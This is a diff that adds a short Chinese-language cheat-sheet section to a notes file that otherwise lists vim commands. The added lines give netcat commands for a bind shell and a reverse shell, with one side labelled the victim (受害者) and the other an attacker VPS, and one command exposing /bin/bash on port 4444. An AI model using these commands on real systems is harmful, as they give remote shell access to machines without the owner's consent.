@@ -234,3 +234,24 @@ x  保存退出
 !  强制执行命令
 
 ```
+
+# 常用命令
+
+## NC
+
+1.正向shell
+
+```
+受害者   nc -lvvp 4444 -t -e /bin/bash
+
+vps     nc cl_ip 4444
+```
+
+2.反向shell
+
+```
+vps 	nc -lvvp 4444
+
+受害者   nc vps_ip 4444 
+```
+
